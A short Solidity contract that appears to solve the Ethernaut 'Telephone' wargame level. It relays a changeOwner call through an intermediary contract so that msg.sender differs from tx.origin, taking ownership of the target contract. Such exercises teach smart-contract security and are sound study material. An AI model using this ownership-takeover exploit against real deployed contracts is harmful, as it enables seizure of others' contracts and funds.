// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract SolveTelephone {
    address immutable TELEPHONE_CONTRACT;

    constructor(address _contract) {
        TELEPHONE_CONTRACT = _contract;
    }

    function callChangeOwner() public {
        ITelephone(TELEPHONE_CONTRACT).changeOwner(msg.sender);
    }
}
